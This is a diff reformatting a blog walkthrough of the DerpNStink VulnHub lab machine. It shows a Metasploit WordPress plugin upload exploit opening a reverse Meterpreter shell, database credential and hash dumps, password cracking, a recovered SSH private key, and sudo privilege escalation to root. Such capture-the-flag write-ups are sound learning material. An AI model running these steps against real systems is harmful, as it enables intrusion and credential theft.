@@ -18,17 +18,17 @@ After all the fun I've had doing vulnhub boxes with my friends, I wanted to try 
 
 > ### Difficulty:
 > Beginner
-> 
+>
 > ### Description:
 > Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...
-> 
+>
 > ### Instructions:
 > This is a boot2root Ubuntu based virtual machine. It was tested on VMware Fusion and VMware Workstation12 using DHCP settings for its network interface. It was designed to model some of the earlier machines I encountered during my OSCP labs also with a few minor curve-balls but nothing too fancy. Stick to your classic hacking methodology and enumerate all the things!
-> 
+>
 > Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder
-> 
+>
 > Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.
-> 
+>
 > ### Contact
 > Hit me up if you enjoy this VM! Twitter: @securekomodo Email: hackerbryan@protonmail.com
 
@@ -36,7 +36,7 @@ After all the fun I've had doing vulnhub boxes with my friends, I wanted to try 
 
 This is a beginner level vulnerable machine, so an nmap scan was pretty sparse. No surprises here. I ended up using all three of the available services to capture the available flags on this machine.
 
-```
+{{< highlight markdown >}}
 msf5 > db_nmap -sV -O -A -p- -T5 target
 [*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-07 00:05 EDT
 [*] Nmap: Nmap scan report for target (192.168.167.145)
@@ -68,17 +68,17 @@ msf5 > db_nmap -sV -O -A -p- -T5 target
 [*] Nmap: 1   0.81 ms derpstink (192.168.167.145)
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
-```
+{{< / highlight >}}
 
 ## HTTP
 
 Since anonymous ftp didn't turn up anything, and we need to have creds for SSH, HTTP was the obvious starting point. I checked out `robots.txt`, and poked with curl. That turned up the first flag almost immediately.
 
-```
+{{< highlight markdown >}}
 curl target
 ...
 <--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
-```
+{{< / highlight >}}
 
 While that was encouraging, I figured it was also maybe a little misleading, and that the rest would be more difficult. That turned out to be correct.
 
@@ -92,7 +92,7 @@ WPScan turned up a lot of vulnerabilities, but many required authentication. I e
 
 Since the output of WPScan can be pretty large, here's just the part I used to get a shell.
 
-```
+{{< highlight markdown >}}
 [+] slideshow-gallery
  | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
  | Last Updated: 2019-04-01T15:08:00.000Z
@@ -113,34 +113,34 @@ Since the output of WPScan can be pretty large, here's just the part I used to g
  |      - http://packetstormsecurity.com/files/131526/
  |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
  |
- ```
+ {{< / highlight >}}
 
 Oh, look! It even has a metasploit module!
 
-```
-msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_user admin                                                                                                         
-wp_user => admin                                                                                                                                                                 
-msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_password admin                                                                                                     
-wp_password => admin                                                                                                                                                             
-msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > exploit                                                                                                                   
-                                                                                                                                                                                 
-[*] Started reverse TCP handler on 192.168.167.137:4444                                                                                                                          
-[*] Trying to login as admin                                                                                                                                                     
-[*] Trying to upload payload                                                                                                                                                     
-[*] Uploading payload                                                                                                                                                            
-[*] Calling uploaded file aazpjbrr.php                                                                                                                                           
-[*] Sending stage (38247 bytes) to 192.168.167.138                                                                                                                               
-[*] Meterpreter session 1 opened (192.168.167.137:4444 -> 192.168.167.138:37182) at 2019-05-05 16:25:53 -0400                                                                    
-[+] Deleted aazpjbrr.php                                                                                                                                                         
-                                                                                                                                                                                 
-                                                                                                                                                                                                                                                                                                            
-meterpreter >                                                                                                                                                                    
-meterpreter > getuid                                                                                                                                                             
-Server username: www-data (33)                                                                                                                                                   
-meterpreter > ls                                                                                                                                                                 
-Listing: /var/www/html/weblog/wp-content/uploads/slideshow-gallery                                                                                                               
-================================================================== 
-```
+{{< highlight markdown >}}
+msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_user admin
+wp_user => admin
+msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_password admin
+wp_password => admin
+msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > exploit
+
+[*] Started reverse TCP handler on 192.168.167.137:4444
+[*] Trying to login as admin
+[*] Trying to upload payload
+[*] Uploading payload
+[*] Calling uploaded file aazpjbrr.php
+[*] Sending stage (38247 bytes) to 192.168.167.138
+[*] Meterpreter session 1 opened (192.168.167.137:4444 -> 192.168.167.138:37182) at 2019-05-05 16:25:53 -0400
+[+] Deleted aazpjbrr.php
+
+
+meterpreter >
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > ls
+Listing: /var/www/html/weblog/wp-content/uploads/slideshow-gallery
+==================================================================
+{{< / highlight >}}
 
 My notes for `/weblog/` definitely include the word `yikes`. With the trivial effort to get a shell, I knew I was going to have to do something tricky to get the next step. Wrong. I made this part harder than it was because I missed an important detail when I tried to move too fast. Let me back up and explain properly before I repeat that mistake here!
 
@@ -148,7 +148,7 @@ My notes for `/weblog/` definitely include the word `yikes`. With the trivial ef
 
 With a shell as the `www-data` user, I could grab credentials for wordpress easily. While I was at it, I grabbed `/etc/passwd` to get a real user list.
 
-```
+{{< highlight markdown >}}
 www-data@DeRPnStiNK:/var/www/html/weblog$ grep -i db wp-config.php
 define('DB_NAME', 'wordpress');
 define('DB_USER', 'root');
@@ -198,12 +198,12 @@ sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
 stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
 ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
 mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
-www-data@DeRPnStiNK:/var/www/html/weblog$ 
-```
+www-data@DeRPnStiNK:/var/www/html/weblog$
+{{< / highlight >}}
 
 Next I was able to connect to mysql and dump some passwords. Since the user/pass combo was so simple, I decided to go right for the gold and connect to mysql db directly:
 
-```
+{{< highlight markdown >}}
 www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -uroot -pmysql mysql
 mysql> select user, host, password from user;
 +------------------+------------------+-------------------------------------------+
@@ -218,12 +218,13 @@ mysql> select user, host, password from user;
 | phpmyadmin       | localhost        | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
 +------------------+------------------+-------------------------------------------+
 7 rows in set (0.00 sec)
+{{< / highlight >}}
 
 Next I popped these hashes into a file for cracking:
 
-```
-root@kali:[~/derpnstink]: 
-[Exit: 0] 00:25: cat johnmysql.txt 
+{{< highlight bash >}}
+root@kali:[~/derpnstink]:
+[Exit: 0] 00:25: cat johnmysql.txt
 root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
 root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
 root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
@@ -232,17 +233,17 @@ debian-sys-maint:*B95758C76129F85E0D68CF79F38B66F156804E93
 unclestinky:*9B776AFB479B31E8047026F1185E952DD1E530CB
 phpmyadmin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441
 ...
-[Exit: 0] 21:01: john --users='unclestinky' --fork=3 --format=mysql-sha1 johnmysql.txt  
+[Exit: 0] 21:01: john --users='unclestinky' --fork=3 --format=mysql-sha1 johnmysql.txt
 ...
-root@kali:[~/derpnstink]: 
-[Exit: 0] 21:01: john --show johnmysql.txt 
+root@kali:[~/derpnstink]:
+[Exit: 0] 21:01: john --show johnmysql.txt
 root:mysql
 root:mysql
 root:mysql
 root:mysql
 unclestinky:wedgie57
 phpmyadmin:admin
-```
+{{< / highlight >}}
 
 ## Whoops
 
@@ -258,9 +259,9 @@ I decided to check my premises. I looked for another walkthrough to get me unstu
 
 The astute reader will notice that the mysql password for `unclestinky` is already included in this post in the output from john the ripper. After grabbing it on [crackstation](https://crackstation.net/), I decided to revisit john. When I re-ran john, I saw what I had missed; it had already cracked the password I wanted. It was still running to crack a password that didn't matter:
 
-```
+{{< highlight markdown >}}
 | debian-sys-maint | localhost        | *B95758C76129F85E0D68CF79F38B66F156804E93 |
-```
+{{< / highlight >}}
 
 ## Back On Track
 
@@ -271,10 +272,10 @@ I had corrected my misstep with the help of the almighty internet and learned so
 
 Now I had the password for the only other wordpress user, which I was sure was the route to getting a foothold as a real user. I logged into wordpress as `unclestinky` and poked around; when I checked the posts section of the admin interface I found a draft called `flag.txt`
 
-```
+{{< highlight markdown >}}
 flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
+{{< / highlight >}}
 
-```
 
 Well that's great.
 
@@ -282,7 +283,7 @@ Well that's great.
 
 Early on I grabbed the `/etc/ssh/sshd_config` file and saw that password authentication was disabled, so I knew if I could re-use this password, it would be via ftp. I also grabbed the `vsftpd` config file, and `/etc/passwd` so I knew the only user who could log in via ftp was the system user`stinky`.
 
-```
+{{< highlight markdown >}}
 www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/vsftpd.conf | grep -vP '^$|^#'
 listen=YES
 anonymous_enable=yes
@@ -302,16 +303,16 @@ pasv_max_port=50000
 userlist_enable=YES
 userlist_file=/etc/vsftpd.userlist
 userlist_deny=NO
-www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ 
+www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$
 
 
 www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/vsftpd.userlist
 stinky
-```
+{{< / highlight >}}
 
 Here's the loot from `stinky`'s ftp access:
 
-```
+{{< highlight markdown >}}
 # from lftp I cat the file:
 ...
 <--- 150 Opening BINARY mode data connection for network-logs/derpissues.txt ...
@@ -331,7 +332,7 @@ Here's the loot from `stinky`'s ftp access:
 12:15 mrderp: alright I made the changes, feel free to decomission my account
 12:20 stinky: done! yay
 719 bytes transferred
-lftp stinky@derpnstink.local:/files> 
+lftp stinky@derpnstink.local:/files>
 ...
 lftp stinky@derpnstink.local:/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh> cat key.txt ...
 -----BEGIN RSA PRIVATE KEY-----
@@ -361,8 +362,8 @@ pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
 UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
 a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 -----END RSA PRIVATE KEY-----
-1675 bytes transferred                  
-```
+1675 bytes transferred
+{{< / highlight >}}
 
 ## SSH
 
@@ -370,65 +371,65 @@ a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 
 The next step was to connect with the ssh key I found as the user `stinky` and see what else I could grab. Oh, look, a flag!
 
-```
-root@kali:[~/derpnstink]:                                                                                                                                                         
-[Exit: 0] 00:25: ssh -i stinky.key stinky@target                                                                                                                                  
-                                                                                                                                                                                  
-Ubuntu 14.04.5 LTS                                                                                                                                                                
-                                                                                                                                                                                  
-                                                                                                                                                                                  
-                       ,~~~~~~~~~~~~~..                                                                                                                                           
+{{< highlight markdown >}}
+root@kali:[~/derpnstink]:
+[Exit: 0] 00:25: ssh -i stinky.key stinky@target
+
+Ubuntu 14.04.5 LTS
+
+
+                       ,~~~~~~~~~~~~~..
                        '  Derrrrrp  N  `
         ,~~~~~~,       |    Stink      |
        / ,      \      ',  ________ _,"
-      /,~|_______\.      \/                                                            
-     /~ (__________)                                 
-    (*)  ; (^)(^)':                    
-        =;  ____  ;           
-          ; """"  ;=                
-   {"}_   ' '""' ' _{"}                                           
-   \__/     >  <   \__/                                        
-      \    ,"   ",  /                                              
-       \  "       /"                                         
-          "      "=                                                
-           >     <                                               
-          ="     "-                     
-          -`.   ,'                                   
-                -                  
-            `--'                   
-                                 
+      /,~|_______\.      \/
+     /~ (__________)
+    (*)  ; (^)(^)':
+        =;  ____  ;
+          ; """"  ;=
+   {"}_   ' '""' ' _{"}
+   \__/     >  <   \__/
+      \    ,"   ",  /
+       \  "       /"
+          "      "=
+           >     <
+          ="     "-
+          -`.   ,'
+                -
+            `--'
+
 Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
-                                  
- * Documentation:  https://help.ubuntu.com/      
-                                            
-331 packages can be updated.                   
-231 updates are security updates.                
-                                            
+
+ * Documentation:  https://help.ubuntu.com/
+
+331 packages can be updated.
+231 updates are security updates.
+
 Last login: Mon May  6 23:51:04 2019 from 192.168.167.7
-                                                 
-stinky@DeRPnStiNK:~$                           
-stinky@DeRPnStiNK:~$ find .       
+
+stinky@DeRPnStiNK:~$
+stinky@DeRPnStiNK:~$ find .
 ...
 stinky@DeRPnStiNK:~$ ls
 Desktop  Documents  Downloads  ftp
 stinky@DeRPnStiNK:~$ ls -r Desktop/
 flag.txt
-stinky@DeRPnStiNK:~$ cat Desktop/flag.txt 
+stinky@DeRPnStiNK:~$ cat Desktop/flag.txt
 flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
 stinky@DeRPnStiNK:~$ ls -r Documents/
 derpissues.pcap
-stinky@DeRPnStiNK:~$ 
-```
+stinky@DeRPnStiNK:~$
+{{< / highlight >}}
 
 More important than the flag, I found the pcap that was referred to in the chat log I found via ftp. I grabbed that and did a very lazy parse. Oh, look, a password!
 
-```
+{{< highlight markdown >}}
 scp -i stinky.key stinky@target:~/Documents/derpissues.pcap .
 # get password for mrderp from pcap ; pass is reused in system and wordpress:
 tshark -r derpissues.pcap -2 -Y http -V  | grep -i pass
 Running as user "root" and group "root". This could be dangerous.
-...                         
-    [Request URI [truncated]: http://derpnstink.local/weblog/wp-admin/load-scripts.php?c=0&load%5B%5D=hoverIntent,common,admin-bar,wp-ajax-response,password-strength-meter,underscore,wp-util,user-profile,svg-painter,heartbeat,wp-a&load%5B%5D=u]                                     
+...
+    [Request URI [truncated]: http://derpnstink.local/weblog/wp-admin/load-scripts.php?c=0&load%5B%5D=hoverIntent,common,admin-bar,wp-ajax-response,password-strength-meter,underscore,wp-util,user-profile,svg-painter,heartbeat,wp-a&load%5B%5D=u]
     Form item: "pass1" = "derpderpderpderpderpderpderp"
         Key: pass1
     Form item: "pass1-text" = "derpderpderpderpderpderpderp"
@@ -436,30 +437,30 @@ Running as user "root" and group "root". This could be dangerous.
     Form item: "pass2" = "derpderpderpderpderpderpderp"
         Key: pass2
 ...
-```
+{{< / highlight >}}
 
 ### MrDerp
 
 Since password auth is disallowed in `sshd_config`, I just did a `su - mrderp` from my shell as `stinky`. I used the password from the packet capture, and was authenticated.
 
-```
+{{< highlight bash >}}
 stinky@DeRPnStiNK:~$ su - mrderp
 Password:
-mrderp@DeRPnStiNK:~$ ls                                                              
-binaries  Desktop  Documents  Downloads                                                                                                                                          
-mrderp@DeRPnStiNK:~$ ls Documents/                                              
-mrderp@DeRPnStiNK:~$ ls Desktop/                                                                                                                                                 
-helpdesk.log                                                                                                                                                                     
-mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log                   
+mrderp@DeRPnStiNK:~$ ls
+binaries  Desktop  Documents  Downloads
+mrderp@DeRPnStiNK:~$ ls Documents/
+mrderp@DeRPnStiNK:~$ ls Desktop/
+helpdesk.log
+mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
 From: Help Desk <helpdesk@derpnstink.local>
 Date: Thu, Aug 23, 2017 at 1:29 PM
 Subject: sudoers ISSUE=242 PROJ=26
 ...
-```
+{{< / highlight >}}
 
 Based on the hint in the helpdesk log, I went straight to looking at `sudo`.
 
-```
+{{< highlight bash >}}
 mrderp@DeRPnStiNK:~/Desktop$ sudo -l
 [sudo] password for mrderp:
 Matching Defaults entries for mrderp on DeRPnStiNK:
@@ -478,14 +479,14 @@ mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy
 # and now I 'm root
 root@DeRPnStiNK:~/binaries# id
 uid=0(root) gid=0(root) groups=0(root)
-```
+{{< / highlight >}}
 
 ### Root
 
 There's not much left to do here. I poked around because I'm curious and wanted to better understand the build of this vulnerable machine. Like most of these, once you have `root`, getting the flag is trivial.
 
-```
-root@DeRPnStiNK:/root/Desktop# cat flag.txt 
+{{< highlight bash >}}
+root@DeRPnStiNK:/root/Desktop# cat flag.txt
 flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
 
 Congrats on rooting my first VulnOS!
@@ -494,7 +495,7 @@ Hit me up on twitter and let me know your thoughts!
 
 @securekomodo
 
-```
+{{< / highlight >}}
 
 ## Summary
 
